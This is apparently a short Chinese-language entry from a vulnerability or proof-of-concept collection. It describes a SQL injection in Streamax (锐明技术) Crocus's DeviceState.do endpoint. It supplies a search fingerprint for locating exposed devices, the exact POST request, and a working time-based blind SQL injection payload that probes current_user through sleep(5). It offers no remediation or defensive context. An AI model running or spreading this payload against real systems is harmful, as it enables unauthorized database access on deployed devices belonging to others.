# 锐明技术Crocus-DeviceState存在SQL注入漏洞

锐明技术 ｜ SQL注入 ｜ —
- **指纹**：`product="Crocus"`
- **请求**：`POST /DeviceState.do?Action=Query HTTP/1.1`

**Payload**
```
EndTime=2025-12-20+00%3A00%3A00&PageIndex=0&PageSize=1&RepairState=-1&StartTime=2025-08-26+00%3A00%3A00&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc
```
- **响应特征**：200